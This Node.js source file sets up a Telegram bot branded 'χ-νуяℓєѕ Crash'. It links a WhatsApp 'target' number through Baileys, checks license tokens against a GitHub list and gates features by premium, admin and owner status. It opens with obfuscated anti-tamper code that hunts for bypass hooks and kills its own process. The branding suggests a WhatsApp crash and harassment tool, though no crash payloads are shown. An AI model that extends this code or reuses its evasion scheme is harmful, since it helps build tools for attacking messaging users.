(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const os = require("os");
const chalk = require("chalk");
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const https = require("https");
const antiLink = {};
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_GINXJAL } = require("./config");
const BOT_TOKEN = TOKEN_GINXJAL;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

// ==================== FUNGSI GET RANDOM IMAGE ====================
function getRandomImage() {
    const images = [
        "https://files.catbox.moe/t39am1.jpg",
        "https://files.catbox.moe/12fl1r.jpg",
        "https://files.catbox.moe/s55rn9.jpg"
    ];
    return images[Math.floor(Math.random() * images.length)];
}

const maxReconnect = 10;
const usePairingCode = true;

/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function runtime(seconds) {
  seconds = Number(seconds);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function memory() {
  return (process.memoryUsage().rss / 1024 / 1024).toFixed(0) + " MB";
}
// ================= SECURITY =================//
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/febrisaputrahm-create/XVYRLES-/refs/heads/main/token.json";////ganti jadi Raw luh



async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token..."));

  const validTokens = await fetchValidTokens();

if (!validTokens.length) {
  console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠

☇ Creator : @fikayaw        
☇ Script  : χ-νуяℓєѕ 𝕮яαѕн
☇ System  : Auto~Update 
`);
  process.exit(1);
}

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(""));
    process.exit(1);
  }

  console.log(chalk.green("✅ Token valid"));
  startBot();
}

function startBot() {
console.log(chalk.red(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠

☇ Creator : @fikayaw        
☇ Script  : χ-νуяℓєѕ 𝕮яαѕн
☇ System  : Auto~Update 
`))
}

validateToken()
/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠

☇ Creator : @fikayaw        
☇ Script  : χ-νуяℓєѕ 𝕮яαѕн
☇ System  : Auto~Update 
`);

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠

☇ Creator : @fikayaw        
☇ Script  : χ-νуяℓєѕ 𝕮яαѕн
☇ System  : Auto~Update 
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙎𝙐𝘾𝘾𝙀𝙎𝙎      
━━━━━━━━━━━━
𝙣𝙤𝙢𝙤𝙧 𝙩𝙖𝙧𝙜𝙚𝙩 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 : ${linkedWhatsAppNumber}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
༒ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙈𝙚𝙣𝙜𝙝𝙪𝙗𝙪𝙣𝙜𝙠𝙖𝙣 𝙆𝙚 𝙒𝙝𝙖𝙩𝙨𝘼𝙥𝙥 !
\`\`\`
`,
              { parse_mode: "Markdown" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ Sender tidak ditemukan/terputus");
  }
  return next();
};

//////////////////////////////////////
const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
let whitelistGroups = []; 
//////////////////////////////////////
let ownerUsers = loadOwner();
let premiumUsers = loadJSON(premiumFile);
let adminList    = [];

loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (!ownerUsers.includes(id)) {
    return ctx.reply("❌ Anda Harus Menjadi Owner Agar Bisa Menggunakan Semua Fitur Tersedia");
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id)
  ) {
    return ctx.reply("❌ Anda Harus Menjadi Admin");
  }

  return next();
};
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();

  
  if (premiumUsers.includes(id)) {
    return next();
  }

 
  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.reply("❌ Anda Belum Menjadi Premium Akses");
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// ================= ANTI FOTO =============== //
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
🔒 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘 𝐌𝐎𝐃𝐄

Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

/// ---- COOLDOWN ---- ///
function parseCooldown(input) {
  const match = input.match(/^(\d+)([dhms])$/);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2];

  switch (unit) {
    case "d": // detik
      return value * 1000;

    case "m": // menit
      return value * 60 * 1000;

    case "h": // jam
      return value * 60 * 60 * 1000;

    case "s": // hari
      return value * 24 * 60 * 60 * 1000;

    default:
      return null;
  }
}


let COOLDOWN_TIME = 1;
let COOLDOWN_TEXT = "1d";
const cooldowns = new Map();

function checkCooldown(ctx, next) {
  if (!ctx.from?.id) return next();


  if (isOwner(ctx.from.id)) return next();


  if (COOLDOWN_TIME === 0) return next();

  const userId = String(ctx.from.id);
  const now = Date.now();

  const expireTime = cooldowns.get(userId) || 0;

  if (now < expireTime) {
    
    if (!cooldowns.get(userId + "_msg")) {
      cooldowns.set(userId + "_msg", true);

      setTimeout(() => cooldowns.delete(userId + "_msg"), 3000);

      return ctx.reply(`⏳ Tunggu ${COOLDOWN_TEXT}!`);
    }
    return;
  }

  
  cooldowns.set(userId, now + COOLDOWN_TIME);

  return next();
}
/// ========== FORCE SUBSCRIBE SYSTEM ==========

let REQUIRED_CHANNEL_USERNAME = "@storeXvyrles";
